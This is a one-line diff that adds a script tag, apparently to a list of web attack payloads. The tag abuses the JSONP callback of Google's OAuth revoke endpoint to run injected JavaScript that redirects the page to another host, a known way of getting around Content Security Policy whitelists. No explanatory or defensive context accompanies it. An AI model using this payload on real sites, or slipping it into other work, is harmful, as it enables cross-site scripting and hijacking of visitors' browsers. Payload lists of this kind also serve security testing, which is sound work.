@@ -1,0 +1,1 @@
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=document.location='http://'%2b'b';"></script>
